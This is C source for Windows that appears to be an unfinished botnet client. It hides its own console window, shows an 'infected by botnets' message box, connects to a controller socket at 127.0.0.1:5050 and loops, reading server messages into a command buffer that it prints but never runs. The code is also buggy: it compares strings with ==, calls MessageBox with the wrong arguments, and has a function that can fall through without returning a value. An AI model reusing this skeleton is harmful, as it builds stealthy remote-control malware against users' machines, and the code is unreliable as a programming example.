#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <math.h>
#include <stdbool.h>

#include <sys/types.h>
#include <sys/locking.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib") // WinSock2 Library

#include <unistd.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <sys/stat.h>

struct ports;
struct hosts;

int bytesrcv = 0;
int vbytes = 0;
int quit = false;


void leak(void) {
    quit = false;
}

void reset_combyt(void) {
    bytesrcv -= bytesrcv;
    vbytes -= vbytes;
}

int storage(char* pkg, char* type, int amt, bool reptu) {

    if (pkg == "add" && amt != 0  && type != NULL) {
        if (type == "bytesrcv") {
            if (bytesrcv != 0) {
                bytesrcv += amt;
            } else {
                bytesrcv = amt;
            }
        } else if (type == "vbytes") {
            if (vbytes != 0) {
                vbytes += amt;
            } else {
                vbytes = amt;
            }
        } else {
            puts("* Type of pkg storage invalid.");
            return 1;
        }
    } else if (pkg == "bytesrcv") {
        if (reptu == true) {
            return bytesrcv;
        } else {
            printf("%d", bytesrcv);
        }
    } else if (pkg == "vbytes") {
        if (reptu == true) {
            return vbytes;
        } else {
            printf("%d", vbytes);
        }
    } else {
        puts("* Type of pkg invalid.");
        return 1;
    }
}

int point(int v, int b_size, bool verbose) {
    v++;
    if (v++ > b_size && verbose) {
        printf("\r* Bytes Received: %d\n", b_size);
        printf("\r* Possible vB: %d\n", v++);
        printf("\r* Saving bytes to buffer\n");
        storage("add", "bytesrcv", b_size, false);
        storage("add", "vbytes", v++, false);
        return 0;
    } else if (v++ > b_size && verbose == false) {
        storage("add", "bytesrcv", b_size, false);
        storage("add", "vbytes", v++, false);
        return 0;

    }

    return 1;
}

int main(int argc, char *argv[]) { 
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0);

    const char host[20] = "127.0.0.1", port[20] = "5050";
    /* 
        Initialise Winsock2
    */

    system("cls");
    printf("* Starting socket connection on %s:%s", host, port);

    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char *message, server_reply[2000];
    int recv_size;
    bool connt;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("* Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }
    MessageBox(0, "Your computer has been infected by botnets.. Enjoy :)", 1);
    printf("\n* Initialised.\n");

    if((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("* Could not create any socket : %d", WSAGetLastError());
    }
    printf("* Socket created. \n");
    printf("* Connecting to a server.. \n");
    server.sin_addr.s_addr = inet_addr(host);
    server.sin_family = AF_INET;
    server.sin_port = htons( atoi(port) );
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {
        puts("* Connect error");
        puts("* Error could be generated cause of the host/port is down or invalid. ");
        connt = false;
        return 1;
    }

    connt = true;
    puts("* Connected, waiting mod welcome");

    if (connt) {
        puts("* Connection still established..");
        puts("* Saving any message bytes for scanning.. \n-------------------------------");
    } else {
        puts("* Connection lost ");
        return 1;
    }

    while (connt == true) {

        // Get Some Data from server
        if ((recv_size = recv(s, server_reply, 2000, 0)) == SOCKET_ERROR) {
            puts("* Recv has failed");
            puts("* Could be the server is hanging..");
            connt = false;
            return 1;
        }
        point(recv_size, recv_size, false);
        server_reply[recv_size] = '\0';
        const char* debug = "Hello v1";
        char* cmd = server_reply;
        if (storage("vbytes", NULL, 0, true) < 1) {
            puts("Server has sent zero bytes message..");
        } else {
            printf("Bytes: vb[%d], brcv[%d]\n", storage("vbytes", NULL, 0, true), storage("bytesrcv", NULL, 0, true));
            printf("[%s]\n", server_reply);
            printf("CMD: [%s]\n", cmd);
            printf("John: %s\n", server_reply);
            reset_combyt();
        }
        // cmp(storage("vbytes", NULL, NULL, true), server_reply);
    }

    return 0;
}